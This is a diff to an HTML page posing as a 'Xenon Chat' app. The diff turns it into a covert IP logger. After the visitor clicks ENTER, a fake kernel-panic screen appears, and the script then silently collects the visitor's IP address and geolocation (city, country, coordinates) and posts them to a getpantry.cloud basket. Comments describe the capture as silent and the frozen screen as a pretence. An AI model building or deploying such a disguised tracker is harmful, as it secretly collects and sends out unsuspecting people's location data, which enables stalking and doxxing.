@@ -5,18 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Xenon Chat</title>
     <style>
-        body {
+        body, html {
             margin: 0;
             padding: 0;
+            height: 100%;
             background: #000;
             color: #0f0;
             font-family: monospace;
-            height: 100vh;
             overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+            cursor: default;
         }
         #landing {
             position: absolute;
@@ -26,134 +23,122 @@
             justify-content: center;
             align-items: center;
             text-align: center;
-        }
-        #main {
-            position: absolute;
-            inset: 0;
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        #ip-page {
-            position: absolute;
-            inset: 0;
             background: #000;
+        }
+        #frozen {
+            position: absolute;
+            inset: 0;
             display: none;
-            flex-direction: column;
+            background: #000;
+            color: #222;
+            font-size: 1.1rem;
             justify-content: center;
             align-items: center;
-            padding: 20px;
-            box-sizing: border-box;
+            flex-direction: column;
+            line-height: 1.8;
+            white-space: pre;
+            user-select: none;
+            pointer-events: none;
         }
-        #setup, #ip-page, #landing {
-            transition: opacity 0.6s ease;
-        }
-        button.big {
-            background: #111;
+        .glitch {
             color: #0f0;
-            border: 2px solid #0f0;
-            padding: 20px 40px;
-            font-size: 2rem;
-            font-family: monospace;
-            margin: 40px 20px;
-            cursor: pointer;
-            border-radius: 8px;
-            transition: all 0.3s;
+            font-size: 4.5rem;
+            letter-spacing: 12px;
+            animation: glitch 4s infinite;
+            text-shadow: 
+                0.05em 0 0 #f00,
+                -0.03em -0.04em 0 #0ff,
+                0.025em 0.04em 0 #f0f;
         }
-        button.big:hover {
+        @keyframes glitch {
+            0% { text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f; }
+            14% { text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f; }
+            15% { text-shadow: -0.05em -0.025em 0 #f00, 0.025em 0.035em 0 #0ff, -0.05em -0.05em 0 #f0f; }
+            49% { text-shadow: -0.05em -0.025em 0 #f00, 0.025em 0.035em 0 #0ff, -0.05em -0.05em 0 #f0f; }
+            50% { text-shadow: 0.05em 0.035em 0 #f00, 0.03em 0 0 #0ff, 0 0.08em 0 #f0f; }
+            99% { text-shadow: 0.05em 0.035em 0 #f00, 0.03em 0 0 #0ff, 0 0.08em 0 #f0f; }
+            100% { text-shadow: -0.025em 0 0 #f00, -0.025em -0.04em 0 #0ff, -0.025em -0.04em 0 #f0f; }
+        }
+        button.enter {
+            margin-top: 80px;
+            background: transparent;
+            border: 2px solid #0f0;
+            color: #0f0;
+            font-size: 2.2rem;
+            padding: 20px 60px;
+            font-family: monospace;
+            cursor: pointer;
+            transition: all 0.4s;
+            letter-spacing: 4px;
+        }
+        button.enter:hover {
             background: #0f0;
             color: #000;
-            box-shadow: 0 0 30px #0f08;
+            box-shadow: 0 0 40px #0f08;
         }
-        input {
-            background: #111;
-            color: #0f0;
-            border: 1px solid #0f0;
-            padding: 15px 25px;
-            font-size: 1.5rem;
-            font-family: monospace;
-            margin: 20px;
-            width: 320px;
-            text-align: center;
+        #frozen p {
+            margin: 8px 0;
+            opacity: 0.7;
         }
-        #ip-display { font-size: 2.4rem; margin: 20px 0; word-break: break-all; max-width: 95%; letter-spacing: 2px; }
-        #geo { font-size: 1.6rem; color: #0f8; margin: 15px 0; min-height: 3.2rem; text-align: center; }
-        #maplink { font-size: 1.4rem; color: #0ff; margin: 30px 0; text-decoration: none; border-bottom: 1px dashed #0ff; }
-        #maplink:hover { background: #0ff3; }
-        #status { font-size: 1.1rem; color: #555; margin-top: 40px; text-align: center; }
-        .hidden { display: none !important; }
+        .blink {
+            animation: blink 1.2s step-end infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
     </style>
 </head>
 <body>
 
-    <!-- Initial landing page with big button -->
+    <!-- Entry screen with single big button -->
     <div id="landing">
-        <div style="font-size: 3.5rem; margin-bottom: 40px; letter-spacing: 6px;">XENON CHAT</div>
-        <button class="big" onclick="enterChat()">GO INTO XENON CHAT</button>
+        <div class="glitch">XENON CHAT</div>
+        <button class="enter" onclick="enterXenon()">ENTER</button>
     </div>
 
-    <!-- Setup: enter room code (shows after clicking the button) -->
-    <div id="setup" class="hidden">
-        <div style="font-size: 2rem; margin-bottom: 30px;">Enter shared room code</div>
-        <input id="room-input" placeholder="e.g. xenon42" maxlength="12" autocomplete="off">
-        <button class="big" onclick="startWithRoom()">CONNECT</button>
-        <div id="setup-status" style="color:#f55; margin-top:30px; font-size:1.2rem;"></div>
-    </div>
-
-    <!-- Main blank capture page -->
-    <div id="main" class="hidden">
-        <div style="font-size:1.2rem; opacity:0.4;">capturing & syncing to <span id="room-show"></span>...</div>
-        <button class="big" style="margin-top:60px; font-size:1.6rem; padding:15px 30px;" onclick="goToIp()">VIEW SHARED DATA →</button>
-    </div>
-
-    <!-- /ip view page -->
-    <div id="ip-page" class="hidden">
-        <div style="font-size:1.8rem; margin-bottom:20px;">Room: <span id="room-display"></span></div>
-        <div id="ip-display">—</div>
-        <div id="geo">—</div>
-        <a id="maplink" href="#" target="_blank" style="display:none;">→ exact location on map</a>
-        <div id="status" style="margin-top:50px;">fetching live data...</div>
-        <button class="big" style="margin-top:60px; font-size:1.6rem; padding:15px 30px;" onclick="goToMain()">BACK</button>
+    <!-- "Frozen" black screen that looks crashed/hacked/frozen -->
+    <div id="frozen">
+        <p>SYSTEM FAILURE - CRITICAL ERROR 0x0000007B</p>
+        <p>INACCESSIBLE_BOOT_DEVICE</p>
+        <p class="blink">[KERNEL_PANIC] Xenon subsystem frozen @ 0000:0000</p>
+        <p>Memory dump in progress... 47% complete</p>
+        <p>Corrupted sector chain detected → attempting recovery loop</p>
+        <p>█▓▓▓▓▓░░░░░░░░░░  0xDEADBEEF overflow</p>
+        <p style="margin-top:60px; font-size:1.4rem; color:#0f0;">connecting to shared shadow node...</p>
+        <p style="font-size:0.9rem; opacity:0.5;">(do not close this window - data sync in background)</p>
     </div>
 
     <script>
-        const PANTRY_BASE = "https://getpantry.cloud/apiv1/pantry/";
-        let ROOM = localStorage.getItem("xenon_room") || "";
-        const REFRESH_MS = 8000;
+        function enterXenon() {
+            document.getElementById("landing").style.display = "none";
+            const frozen = document.getElementById("frozen");
+            frozen.style.display = "flex";
 
-        function enterChat() {
-            document.getElementById("landing").classList.add("hidden");
-            if (ROOM) {
-                // Already have room → go straight to main capture
-                document.getElementById("main").classList.remove("hidden");
-                document.getElementById("room-show").textContent = ROOM;
+            // Fake "frozen" delay before actual capture starts (looks stuck)
+            setTimeout(() => {
+                // Silent capture + upload happens here in background
                 captureAndUpload();
-            } else {
-                // First time → show room setup
-                document.getElementById("setup").classList.remove("hidden");
-            }
+            }, 12000); // pretend it's "stuck" for ~12 seconds
+
+            // Optional: after long time, show tiny hint or auto-redirect – but for now keep frozen look
         }
 
-        function startWithRoom() {
-            const input = document.getElementById("room-input").value.trim().toLowerCase();
-            if (!input || input.length < 4) {
-                document.getElementById("setup-status").textContent = "use at least 4 characters";
-                return;
-            }
-            ROOM = input;
+        const PANTRY_BASE = "https://getpantry.cloud/apiv1/pantry/";
+        let ROOM = localStorage.getItem("xenon_room") || "";
+
+        // If no room yet, generate a random one (or prompt – but keeping minimal/no buttons)
+        if (!ROOM) {
+            ROOM = "xenon-" + Math.random().toString(36).substr(2, 6);
             localStorage.setItem("xenon_room", ROOM);
-            document.getElementById("setup").classList.add("hidden");
-            document.getElementById("main").classList.remove("hidden");
-            document.getElementById("room-show").textContent = ROOM;
-            captureAndUpload();
         }
 
         async function captureAndUpload() {
             try {
+                // Get IP
                 const ipRes = await fetch("https://api.ipify.org?format=json");
                 const { ip } = await ipRes.json();
 
+                // Get geo
                 const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                 const geo = await geoRes.json();
 
@@ -164,86 +149,23 @@
                         city: geo.city || geo.region || "?",
                         country: geo.country_name || "?"
                     };
+                    // Upload to shared "pantry" basket using room as key
                     await fetch(PANTRY_BASE + ROOM, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ ip, geo: geoData })
+                        body: JSON.stringify({ ip, geo: geoData, ts: Date.now() })
                     });
                 }
-            } catch (e) {}
-        }
-
-        async function fetchShared() {
-            if (!ROOM) return null;
-            try {
-                const res = await fetch(PANTRY_BASE + ROOM);
-                if (!res.ok) return null;
-                return await res.json();
             } catch (e) {
-                return null;
-            }
-        }
-
-        function updateIpDisplay(data) {
-            const ipEl    = document.getElementById("ip-display");
-            const geoEl   = document.getElementById("geo");
-            const mapEl   = document.getElementById("maplink");
-            const status  = document.getElementById("status");
-
-            if (!data || !data.ip) {
-                ipEl.textContent = "—";
-                geoEl.textContent = "no data in room yet";
-                mapEl.style.display = "none";
-                status.textContent = "waiting for capture...";
-                return;
+                // silent fail – keep looking frozen
             }
 
-            ipEl.textContent = data.ip;
-            const g = data.geo || {};
-            geoEl.innerHTML = `${g.city || "?"} • ${g.country || "?"}<br>${(g.lat||0).toFixed(6)}, ${(g.lon||0).toFixed(6)}`;
-
-            if (g.lat && g.lon) {
-                mapEl.href = `https://www.openstreetmap.org/?mlat=${g.lat}&mlon=${g.lon}#map=15/${g.lat}/${g.lon}`;
-                mapEl.style.display = "inline-block";
-            } else {
-                mapEl.style.display = "none";
-            }
-
-            status.textContent = `live • room: ${ROOM} • auto-refresh every ${REFRESH_MS/1000}s`;
+            // After capture, stay frozen-looking forever (or add tiny link later if wanted)
+            // For now: infinite "frozen" aesthetic
         }
 
-        async function liveRefresh() {
-            const data = await fetchShared();
-            updateIpDisplay(data);
-        }
-
-        function goToIp() {
-            document.getElementById("main").classList.add("hidden");
-            document.getElementById("ip-page").classList.remove("hidden");
-            document.getElementById("room-display").textContent = ROOM;
-            liveRefresh();
-            const interval = setInterval(liveRefresh, REFRESH_MS);
-            // Cleanup on leave
-            const cleanup = () => clearInterval(interval);
-            window.addEventListener("hashchange", cleanup, {once: true});
-            // Also stop if going back via button
-            document.querySelector("#ip-page button").onclick = () => {
-                cleanup();
-                goToMain();
-            };
-        }
-
-        function goToMain() {
-            document.getElementById("ip-page").classList.add("hidden");
-            document.getElementById("main").classList.remove("hidden");
-            captureAndUpload(); // refresh capture when returning
-        }
-
-        // If reloaded with #ip → go directly there (optional)
-        if (location.hash === "#ip" && ROOM) {
-            enterChat();
-            setTimeout(goToIp, 500);
-        }
+        // Optional: if you want to view data later, open ...#ip or bookmark separately
+        // But per request: no buttons to view – just capture on enter
     </script>
 </body>
 </html>
